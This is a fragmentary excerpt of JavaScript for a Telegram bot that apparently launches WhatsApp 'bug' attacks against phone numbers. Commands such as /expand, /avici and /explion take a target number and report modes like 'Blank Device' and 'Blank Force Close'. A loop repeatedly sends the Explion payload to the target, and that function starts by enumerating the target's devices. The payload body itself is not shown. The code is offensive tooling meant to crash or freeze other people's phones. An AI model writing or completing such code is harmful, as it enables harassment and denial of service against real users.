...
const thumbnailUrl = "https://files.catbox.moe/yzcigk.png";
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /expand 62xxxx");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Iphone Force 
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Expand Invisible Started…</b>
</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Delay Invisible Hard
<b>⟢ Status :</b> <i>Sukses…</i>

<b>🐰 Delay Invisible Sukses…</b>
</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /avici 62xxxx");
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /xivilian 62xxxx");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Blank Device 
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Message Blank Started…</b>
</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /explion 62xxxx");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Blank Force Close 
<b>⟢ Status :</b> <i>Sukses…</i>

<b>🐰 Message Force Sukses…</b>
</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
...
while (bugIntervals[target]) {
  ...
  await Explion(sock, target, true);
  sendCount++;
  if (sendCount % 5 === 0) {
    console.log(chalk.yellow("⏸ Tredict Invictus Send Bug"));
    await new Promise(res => setTimeout(res, 1500));
...
async function Explion(sock, target) {
  await privatedelay();
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
